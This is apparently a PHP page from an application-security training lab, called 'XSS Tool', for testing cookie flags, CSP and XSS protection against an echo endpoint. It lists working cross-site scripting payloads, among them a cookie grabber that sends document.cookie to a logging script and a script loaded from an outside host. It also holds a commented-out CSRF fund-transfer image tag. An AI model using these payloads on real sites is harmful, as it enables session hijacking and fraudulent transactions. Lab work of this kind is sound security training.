<!DOCTYPE HTML PUBLIC "-//W3C/DTD HTML 4.0 Transitional//EN">
<html>
<head><title> <?php echo $title = "XSS Tool"; ?></title>
  <link rel="stylesheet" type="text/css" href="../include/styles.css" />
</head>
  <body>
    <script type="text/javascript">
		//<![CDATA[
		function toggle(o) {
			var e = document.getElementById(o);
			e.style.display = (e.style.display == 'none') ? 'block' : 'none';
		}

		//]]>

		if ( typeof (Storage) !== "undefined") {
			localStorage.localKey = "localValue";
			sessionStorage.sessionKey = "sessionValue";
		}
    </script>
    <div id="main">
    <?php
	define("ABS_PATH", $_SERVER['DOCUMENT_ROOT']);
	include (ABS_PATH . "/appsec/include/header.php");
    ?>
    
    <div id="divContainer" align=center>
      <FORM METHOD=POST ACTION="echo.php">
      <table width="80%" border="0" cellpadding="3" cellspacing="3" bgcolor="#FFFFFF">
        <tr>
          <td colspan="3"><strong>Entry Form</strong></td>
        </tr>
        <tr>
          <td width="150">Username</td>
          <td width="6">:</td>
          <td width="294"><input name="userid" type="text" id="userid"></td>
        </tr>
        <tr>
          <td>Role</td>
          <td>:</td>
          <td><input name="role" type="text" id="role"></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>
          <input name="httponly" type="checkbox" class="css-cb" id="httponly">
          <label for="httponly" name="httponly" class="css-lbl">HTTPOnly</label>
          </td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td><input name="secure" type="checkbox" class="css-cb" id="secure">
          <label for="secure" name="secure" class="css-lbl">Secure</label></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td><input name="csp" type="checkbox" class="css-cb" id="csp">
          <label for="csp" name="csp" class="css-lbl">CSP</label></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td><input name="xssP" type="checkbox" class="css-cb" id="xssP">
          <label for="xssP" name="xssP" class="css-lbl">XSS Protection</label></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td><input type="submit" class="button" name="Submit" value="Submit"></td>
        </tr>
        </table>
      </form>
    </div>
    
    <div id="divContainer" align=center>
      <a href="#" onclick="toggle('list');"><i><b>Show/Hide Scripts<b></i></a>
      <div id="list" style="display: none;">
        <ul>
        <table align="center">
          <tr> 
          <td colspan=2><hr></td>
          </tr>
          <tr> 
          <td>XSS cookie</td>
          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr border=1></td>
          </tr>
          
          <td>XSS webstorage</td>
          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;alert('localStorage: '+localStorage.localKey+'\nsessionStorage: '+sessionStorage.sessionKey)&lt;/script&gt;</i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr border=1></td>
          </tr>
          
          <td>Remote XSS </td>
          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script src=http://ha.ckers.org/xss.js&gt;&lt;/script&gt;</i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr border=1></td>
          </tr>
          
              
          
          <tr> 
          <td>XSS Cookie Grabber</a></td>
          <td><font size=2 color=#0196e3 face=monospace><i>&lt;script&gt;document.location='/appsec/xss/cgrab.php?cookie=' + document.cookie&lt;/script&gt;</i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr border=1></td>
          </tr>
        
          <tr> 
          <td>Log File Link</a></td>
          <td><font size=2 color=#0196e3 face=monospace><i>&nbsp;<a href="log.txt">log.txt</a>&nbsp; & &nbsp;<a href="cgrab.php?flush">FlushLog</a></i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr border=1></td>
          </tr>
            
          <!--tr> 
          <td>XSRF </td>
          <td><font size=2 color=red face=monospace><i>&lt;img height=0 width=0 src=../bank.com/fundtransfer.php?toacc=attacker&amp;fromacc=victim&amp;amt=3500&amp;submit=Submit&gt;</i></font></td>
          </tr>
          <tr> 
          <td colspan=2><hr></td>
          </tr-->
          
        </table>
        </ul>
      </div>
    </div>
    
    <div id="divContainer" align=center>
      <h3> Execute XSS(POST)</h3>
      <form id="xssForm"name="xssForm" action="echo.php" method="POST">
        <input type='hidden' name='userid' value="<script>alert(document.cookie.concat('\nXSS Found in POST'))</script>"/>
        <a href="" onclick="document.xssForm.submit();return false;">Execute</a>
      </form>
    </div>
    
    <div id="divContainer" align=center>
      <h3>Execute XSS (GET)</h3>
      <a href="echo.php?userid=<script>alert(document.cookie.concat('\nXSS Found in GET'))</script>">Execute</a>
    </div>
   <?php
		include '../include/footer.php';
 ?>
  </div>
 
</body>
</html>